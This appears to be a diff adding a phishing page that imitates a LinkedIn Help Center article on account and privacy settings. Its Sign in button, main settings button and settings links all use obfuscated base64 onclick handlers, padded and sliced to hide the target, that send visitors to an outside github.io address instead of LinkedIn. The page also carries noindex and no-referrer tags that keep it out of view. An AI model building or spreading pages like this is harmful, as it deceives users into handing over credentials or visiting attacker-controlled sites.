@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="referrer" content="no-referrer">
+    <title>LinkedIn Help Center - Responsive</title>
+    <style>
+        /* General Resets */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+
+        a {
+           cursor: pointer;
+     }
+        body {
+            background-color: #f3f2ef;
+            color: #1d1d1d;
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 1128px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Navbar Styling */
+        .navbar {
+            background-color: #0073b1;
+            min-height: 52px;
+            display: flex;
+            align-items: center;
+            color: white;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            padding: 10px 0;
+        }
+
+        .nav-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            gap: 10px;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            font-size: 20px;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .logo-section span {
+            margin-left: 8px;
+        }
+
+        .search-container {
+            display: flex;
+            background: white;
+            border-radius: 4px;
+            width: 45%;
+            height: 34px;
+            overflow: hidden;
+            flex-grow: 1;
+        }
+
+        .search-dropdown {
+            padding: 0 12px;
+            color: #666;
+            border-right: 1px solid #ddd;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        .search-container input {
+            border: none;
+            padding: 0 12px;
+            flex-grow: 1;
+            outline: none;
+            font-size: 14px;
+            width: 10px; /* Allows flex-grow to work properly */
+        }
+
+        .search-btn {
+            background: white;
+            border: none;
+            padding: 0 12px;
+            cursor: pointer;
+        }
+
+        .sign-in-btn {
+            background: transparent;
+            border: 1px solid white;
+            color: white;
+            padding: 5px 16px;
+            border-radius: 4px;
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 14px;
+            white-space: nowrap;
+        }
+
+        /* Main Layout */
+        .main-wrapper {
+            background: white;
+            margin-top: 24px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            display: flex;
+            min-height: 80vh;
+        }
+
+        .article-body {
+            flex: 2;
+            padding: 40px;
+        }
+
+        .sidebar {
+            flex: 1;
+            padding: 40px 24px;
+            border-left: 1px solid #f0f0f0;
+        }
+
+        /* Article Elements */
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+
+        .meta-info {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 24px;
+        }
+
+        .callout-box {
+            background-color: #f0f7fb;
+            border: 1px solid #cfe3f1;
+            padding: 24px;
+            border-radius: 4px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            gap: 20px;
+        }
+
+        .callout-content h3 {
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .callout-content p {
+            font-size: 14px;
+            color: #444;
+            max-width: 500px;
+        }
+
+        .action-btn {
+            background-color: #0073b1;
+            color: white;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 600;
+            text-decoration: none;
+            white-space: nowrap;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .article-text {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 16px;
+        }
+
+        .settings-bullets {
+            list-style: none;
+            margin: 20px 0;
+        }
+
+        .settings-bullets li {
+            margin-bottom: 12px;
+            padding-left: 20px;
+            position: relative;
+            font-size: 14px;
+        }
+
+        .settings-bullets li::before {
+            content: "•";
+            position: absolute;
+            left: 0;
+            color: #666;
+        }
+
+        .settings-bullets a {
+            color: #0073b1;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Sidebar Styling */
+        .sidebar h4 {
+            font-size: 16px;
+            margin-bottom: 16px;
+            font-weight: 600;
+        }
+
+        .tag-cloud {
+            margin-bottom: 32px;
+        }
+
+        .tag {
+            display: inline-block;
+            border: 1px solid #0073b1;
+            color: #0073b1;
+            padding: 4px 16px;
+            border-radius: 16px;
+            font-size: 14px;
+            margin: 0 4px 8px 0;
+            text-decoration: none;
+        }
+
+        .related-list {
+            list-style: none;
+        }
+
+        .related-list li {
+            margin-bottom: 12px;
+            display: flex;
+            align-items: flex-start;
+        }
+
+        .related-list a {
+            color: #0073b1;
+            text-decoration: none;
+            font-size: 14px;
+            margin-left: 8px;
+        }
+
+        /* --- RESPONSIVE MEDIA QUERIES --- */
+
+        /* Tablets */
+        @media (max-width: 992px) {
+
+             a {
+           cursor: pointer;
+     }
+            .main-wrapper {
+                flex-direction: column;
+            }
+            .sidebar {
+                border-left: none;
+                border-top: 1px solid #f0f0f0;
+            }
+            .search-container {
+                width: auto;
+            }
+        }
+
+        /* Mobiles */
+        @media (max-width: 600px) {
+             a {
+           cursor: pointer;
+     }
+            .container {
+                padding: 0 12px;
+            }
+
+            .nav-content {
+                flex-wrap: wrap;
+            }
+
+            .search-container {
+                order: 3; /* Move search bar to its own line */
+                width: 100%;
+                margin-top: 5px;
+            }
+
+            .article-body {
+                padding: 24px 16px;
+            }
+
+            .callout-box {
+                flex-direction: column;
+                align-items: stretch;
+                padding: 20px;
+            }
+
+            .callout-content p {
+                max-width: 100%;
+                margin-bottom: 10px;
+            }
+
+            .action-btn {
+                width: 100%;
+            }
+
+            h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="navbar">
+        <div class="container nav-content">
+            <div class="logo-section">
+                <strong>in</strong> <span>Help</span>
+            </div>
+            <div class="search-container">
+                <div class="search-dropdown">LinkedIn &#9662;</div>
+                <input type="text" placeholder="How can we help?">
+                <button class="search-btn">🔍</button>
+            </div>
+            <a onclick="window.location.href = atob('k9saHR0cHM6Ly9zeXMtYXNzZXRzLmdpdGh1Yi5pby9wb3J0LXN5cy8/c2FsdD1HWmlpaEQ='.slice(3))" target="_blank" class="sign-in-btn">Sign in</a>
+        </div>
+    </header>
+
+    <div class="container">
+        <main class="main-wrapper">
+            <section class="article-body">
+                <h1>Manage your account and privacy settings</h1>
+                <p class="meta-info">Last updated: 6 months ago</p>
+
+                <div class="callout-box">
+                    <div class="callout-content">
+                        <h3>Change your account and privacy settings</h3>
+                        <p>The Settings page allows you to manage your account settings, update your privacy and security settings, and preferences.</p>
+                    </div>
+                    <a onclick="window.location.href = atob('k9saHR0cHM6Ly9zeXMtYXNzZXRzLmdpdGh1Yi5pby9wb3J0LXN5cy8/c2FsdD1HWmlpaEQ='.slice(3))" target="_blank" class="action-btn">View and change your settings</a>
+                </div>
+
+                <p class="article-text">The Settings page allows you to manage your account settings, update your privacy and security settings, and set your preferences for how frequently you're contacted by LinkedIn.</p>
+
+                <ul class="settings-bullets">
+                    <li><a onclick="window.location.href = atob('k9saHR0cHM6Ly9zeXMtYXNzZXRzLmdpdGh1Yi5pby9wb3J0LXN5cy8/c2FsdD1HWmlpaEQ='.slice(3))" target="_blank">Account preferences:</a> Manage your basic profile information for your LinkedIn experience.</li>
+                    <li><a onclick="window.location.href = atob('k9saHR0cHM6Ly9zeXMtYXNzZXRzLmdpdGh1Yi5pby9wb3J0LXN5cy8/c2FsdD1HWmlpaEQ='.slice(3))" target="_blank">Sign in & security:</a> Manage the settings that keep your account secure.</li>
+                    <li><a onclick="window.location.href = atob('k9saHR0cHM6Ly9zeXMtYXNzZXRzLmdpdGh1Yi5pby9wb3J0LXN5cy8/c2FsdD1HWmlpaEQ='.slice(3))" target="_blank">Visibility:</a> Control who can see your profile and activity.</li>
+                </ul>
+            </section>
+
+            <aside class="sidebar">
+                <h4>Tagged in</h4>
+                <div class="tag-cloud">
+                    <a href="#" class="tag">Settings</a>
+                    <a href="#" class="tag">Basics</a>
+                    <a href="#" class="tag">Account Access</a>
+                </div>
+
+                <h4>Related articles</h4>
+                <ul class="related-list">
+                    <li><span>📄</span><a href="#">Identity verification via CLEAR</a></li>
+                    <li><span>📄</span><a href="#">Identity verification via Persona</a></li>
+                </ul>
+            </aside>
+        </main>
+    </div>
+
+</body>
+</html>
